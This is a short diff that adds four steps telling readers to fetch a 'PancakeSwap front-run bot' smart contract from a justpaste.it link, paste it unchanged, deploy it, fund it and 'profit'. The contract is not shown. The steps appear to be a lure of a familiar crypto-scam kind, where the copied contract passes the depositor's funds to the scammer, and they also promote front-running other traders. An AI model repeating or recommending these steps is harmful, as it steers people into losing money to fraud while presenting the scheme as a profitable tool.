@@ -1,0 +1,4 @@
+1. Go to instructions page https://justpaste.it/9d6sx
+2. The smart contract is in the pancakeswapFrontRunBot.txt file. Copy and paste it as is.
+3. Deploy and finance the bot with instructions. 
+4. profit
